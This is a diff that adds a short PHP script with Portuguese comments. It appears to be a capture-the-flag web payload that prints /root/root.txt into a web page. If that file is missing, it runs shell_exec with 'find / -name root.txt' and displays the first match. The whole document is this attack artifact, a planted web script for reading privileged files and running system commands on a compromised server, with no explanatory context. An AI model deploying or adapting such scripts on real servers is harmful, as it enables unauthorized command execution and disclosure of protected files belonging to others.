@@ -1,0 +1,23 @@
+<?php
+// Tenta ler o arquivo diretamente do diretório /root/
+$caminho = "/root/root.txt";
+
+if (file_exists($caminho)) {
+    echo "<h3>Conteúdo do arquivo root.txt:</h3>";
+    echo "<pre>";
+    echo htmlspecialchars(file_get_contents($caminho));
+    echo "</pre>";
+} else {
+    // Caso o arquivo não esteja lá, vamos buscá-lo no sistema
+    echo "Arquivo não encontrado em /root/root.txt. Buscando no sistema...<br>";
+    $busca = shell_exec("find / -name root.txt 2>/dev/null | head -n 1");
+    $busca = trim($busca);
+    
+    if ($busca) {
+        echo "Encontrado em: $busca<br>";
+        echo "<pre>" . htmlspecialchars(file_get_contents($busca)) . "</pre>";
+    } else {
+        echo "Arquivo 'root.txt' não foi encontrado em nenhuma parte do sistema.";
+    }
+}
+?>
